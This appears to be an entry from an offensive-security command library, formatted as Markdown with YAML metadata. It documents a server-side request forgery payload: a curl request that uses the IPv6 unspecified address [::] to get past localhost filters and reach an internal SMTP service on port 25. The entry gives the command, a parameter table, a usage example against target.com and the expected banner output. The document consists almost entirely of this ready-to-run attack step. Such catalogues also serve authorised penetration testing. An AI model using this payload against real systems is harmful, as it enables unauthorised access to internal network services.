---
type: command
executor: bash
data: 'curl "http://$_TARGET_APP/ssrf?url=http://[::]:25/"'
output: null
platforms:
  - Web
tags:
  - ssrf
  - ipv6
  - smtp
verified: true
validated: true
---

# access-internal-smtp-via-ssrf-ipv6-unspecified

## Command

```bash
curl "http://$_TARGET_APP/ssrf?url=http://[::]:25/"
```

## Description

Sends an SSRF payload to access an internal SMTP service on port 25 using IPv6 unspecified address to evade localhost filters.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_TARGET_APP | Vulnerable application URL | Yes |

## Examples

### Basic Usage

```bash
curl "http://target.com/ssrf?url=http://[::]:25/"
```

## Expected Output

May return SMTP banner if the SSRF fetcher interprets the non-HTTP protocol, e.g., "220 internal-mail ESMTP Ready". Otherwise, connection error.

## Related

- [[procedures/Bypass-SSRF-Filters-with-IPv6-Loopback-Addresses]]
